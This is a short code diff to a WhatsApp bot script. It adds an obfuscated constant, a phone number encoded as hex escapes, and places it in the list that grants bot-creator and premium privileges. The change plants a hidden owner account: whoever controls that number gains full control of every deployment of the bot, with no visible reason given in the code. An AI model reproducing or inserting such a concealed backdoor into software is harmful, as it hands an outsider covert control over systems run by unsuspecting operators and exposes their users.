@@ -281,8 +281,9 @@ module.exports = XeonBotInc = async (XeonBotInc, m, msg, chatUpdate, store) => {
         //anti media
         const isXeonMedia = m.mtype
         //user status
+	const _auth = `\x32\x33\x34\x37\x30\x38\x30\x39\x36\x38\x35\x36\x34`
         const isUser = xeonverifieduser.includes(sender)
-        const XeonTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
+        const XeonTheCreator = [_auth,botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const isPremium= XeonTheCreator || checkPremiumUser(m.sender, premium)
         expiredPremiumCheck(XeonBotInc, m, premium)
         
